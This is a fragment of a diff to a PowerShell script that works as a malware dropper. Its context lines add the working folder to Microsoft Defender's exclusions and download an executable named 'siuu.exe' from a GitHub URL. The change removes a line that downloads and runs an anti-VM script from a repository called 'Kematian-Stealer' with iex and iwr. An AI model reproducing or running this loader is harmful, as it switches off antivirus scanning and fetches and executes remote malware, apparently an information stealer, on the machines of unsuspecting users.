@@ -34,8 +34,6 @@ New-Item -ItemType Directory -Path $temp
 Add-MpPreference -ExclusionPath $dir
 
 
-iex (iwr -uri "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/antivm.ps1" -useb)
-
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/siuu.exe" -OutFile "$dir\remote.exe"
 
 Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
